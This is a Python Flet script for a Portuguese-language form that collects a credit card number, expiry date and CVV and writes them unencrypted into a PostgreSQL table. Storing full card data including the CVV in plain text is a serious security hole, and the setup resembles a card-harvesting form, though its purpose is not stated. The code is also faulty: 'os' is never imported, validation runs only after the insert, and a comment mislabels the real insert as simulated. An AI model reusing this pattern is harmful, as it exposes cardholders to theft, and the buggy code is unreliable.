import flet as ft
import psycopg2

def main(page: ft.Page):
    # Configurações da página
    page.title = "Formulário de Dados"
    page.vertical_alignment = ft.MainAxisAlignment.CENTER
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
    page.bgcolor = ft.Colors.WHITE
    page.padding = 30

    # Funções de formatação
    def format_card(e):
        text = e.control.value.replace("-", "")
        if len(text) < 16:
            return
        formatted = ""
        for i in range(0, 16, 4):
            formatted += text[i:i + 4] + "-"
        e.control.value = formatted.strip("-")
        e.control.update()

    def format_date(e):
        text = e.control.value.replace("/", "")[:4]
        if len(text) < 4:
            return
        formatted = ""
        for i in range(0, 4, 2):
            formatted += text[i:i + 2] + "/"
        e.control.value = formatted.strip("/")
        e.control.update()

    def show_dialog(title, content):
        """Função reutilizável para exibir diálogos"""
        dialog = ft.AlertDialog(
            title=ft.Text(title),
            content=ft.Text(content),
            actions=[ft.TextButton("OK", on_click=close_dialog)],
            on_dismiss=lambda e: print("Diálogo fechado")
        )
        page.dialog = dialog
        dialog.open = True
        page.update()

    def close_dialog(e):
        page.dialog.open = False
        page.update()

    # Elementos do formulário
    campo12 = ft.TextField(
        label="Número do Cartão",
        max_length=19,
        on_change=format_card,
        keyboard_type=ft.KeyboardType.NUMBER,
        border_color=ft.Colors.PURPLE_700,
        color=ft.Colors.WHITE,
        bgcolor=ft.Colors.BLACK87,
        border_radius=15,
        prefix_icon=ft.Icons.CREDIT_CARD,
    )

    campoData = ft.TextField(
        label="Validade (MM/AA)",
        max_length=7,
        on_change=format_date,
        keyboard_type=ft.KeyboardType.NUMBER,
        border_color=ft.Colors.PURPLE_700,
        color=ft.Colors.WHITE,
        bgcolor=ft.Colors.BLACK87,
        border_radius=15,
        prefix_icon=ft.Icons.CALENDAR_MONTH,
        width=200
    )

    campo3 = ft.TextField(
        label="CVV",
        max_length=3,
        keyboard_type=ft.KeyboardType.NUMBER,
        border_color=ft.Colors.PURPLE_700,
        color=ft.Colors.WHITE,
        bgcolor=ft.Colors.BLACK87,
        border_radius=15,
        prefix_icon=ft.Icons.LOCK,
        width=150
    )

    # Função de envio de dados
    def enviar_dados(e):
        try:
            # Remover formatação dos dados
            card_number = campo12.value.replace("-", "")
            expiry_date = campoData.value.replace("/", "")
            cvv = campo3.value

            # Conexão com o banco de dados
            conn = psycopg2.connect(
                os.getenv("DB_CONNECTION_STRING")
            )
            cursor = conn.cursor()

            # Inserir dados
            cursor.execute(
                "INSERT INTO dados (card_number, expiry_date, cvv) VALUES (%s, %s, %s)",
                (card_number, expiry_date, cvv)
            )

            conn.commit()
            conn.close()

            if not all([card_number, expiry_date, cvv]):
                show_dialog("Aviso", "Preencha todos os campos!")
                return

            # Simulação de inserção bem-sucedida
            print("Dados simulados:", card_number, expiry_date, cvv)

            # Limpar campos
            campo12.value = ""
            campoData.value = ""
            campo3.value = ""
            page.update()

            # Mostrar diálogo de sucesso
            show_dialog("Sucesso!", "Dados enviados com sucesso!")

        except Exception as error:
            show_dialog("Erro", f"Ocorreu um erro: {str(error)}")

    botao_enviar = ft.ElevatedButton(
        "Enviar Dados",
        on_click=enviar_dados,
        icon=ft.Icons.SEND,
        color=ft.Colors.WHITE,
        bgcolor=ft.Colors.PURPLE_700,
        height=50,
        width=200,
        style=ft.ButtonStyle(
            shape=ft.RoundedRectangleBorder(radius=10),
            overlay_color=ft.Colors.PURPLE_900
        )
    )

    # Layout
    page.add(
        ft.Column(
            [
                ft.Row([campo12], alignment=ft.MainAxisAlignment.CENTER),
                ft.Row([campoData, campo3], alignment=ft.MainAxisAlignment.CENTER),
                ft.Row([botao_enviar], alignment=ft.MainAxisAlignment.CENTER)
            ],
            spacing=30,
            width=600,
        )
    )

ft.app(target=main)
